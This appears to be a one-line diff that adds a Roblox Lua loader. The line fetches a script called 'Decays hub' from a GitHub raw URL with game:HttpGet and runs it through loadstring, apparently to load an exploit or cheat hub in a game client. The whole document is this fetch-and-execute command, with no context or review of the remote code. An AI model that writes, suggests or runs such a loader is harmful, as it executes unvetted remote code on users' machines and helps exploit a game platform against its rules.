@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/honoredtriangle/Decay/refs/heads/main/Decays%20hub"))()
